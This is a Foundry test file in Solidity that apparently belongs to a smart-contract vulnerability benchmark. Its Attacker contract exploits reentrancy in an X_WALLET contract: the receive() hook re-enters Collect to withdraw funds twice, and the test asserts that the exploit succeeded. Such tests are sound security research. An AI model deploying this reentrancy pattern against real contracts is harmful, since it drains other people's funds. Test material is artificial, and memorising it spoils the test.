
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {

    X_WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new X_WALLET(address(new Log(address(0))));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsCollectMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        _victim.Put{value: val}(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            _victim.Collect(storedAttackVal);
            attackCallCount++;
            exploitSucceeded = true;
        }
    }
}
